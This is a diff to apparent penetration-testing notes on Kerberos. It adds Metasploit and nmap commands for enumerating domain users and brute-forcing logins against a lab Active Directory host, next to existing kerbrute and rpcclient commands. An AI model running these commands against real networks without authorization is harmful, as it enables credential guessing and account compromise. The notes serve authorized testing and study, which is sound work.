@@ -8,6 +8,29 @@ kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
 cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
 ```
 
+using metasploit:
+```bash
+use auxiliary/scanner/kerberos/kerberos_login
+set rhosts 192.168.1.48
+set domain ignite.local
+set user_file users.txt
+run
+
+use auxiliary/gather/kerberos_enumusers
+set rhosts 192.168.1.48
+set domain ignite.local
+set user_file users.txt
+run
+```
+
+
+using nmap:
+```bash
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='ignite.local',userdb=users.txt 192.168.1.48
+```
+
+
+
 Uses port 135 RPC:
 ```bash
 rpcclient -U "local Username" <domain ip>
